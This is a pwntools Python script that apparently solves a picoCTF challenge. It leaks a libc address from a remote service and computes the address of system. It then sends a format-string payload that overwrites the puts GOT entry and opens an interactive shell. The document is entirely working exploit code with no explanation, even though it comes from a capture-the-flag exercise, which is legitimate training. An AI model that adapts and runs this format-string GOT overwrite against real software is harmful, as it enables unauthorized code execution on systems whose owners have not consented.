from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

p = remote('rhea.picoctf.net', 61457)
e = ELF('vuln') ####
libc = ELF('libc.so.6')
offset = libc.sym['system'] - libc.sym['setvbuf']

# Calculate system_addr
p.recvuntil(b"libc: ")
setvbuf_addr = int(p.recvline()[:-1], 16)
system_addr = setvbuf_addr + offset
log.info(f"system: {hex(system_addr)}")

# Get puts_got
puts_got = e.got['puts']
log.info(f"puts_got: {hex(puts_got)}")

# payload
payload = fmtstr_payload(38, {puts_got: system_addr})
p.sendline(payload)
p.interactive()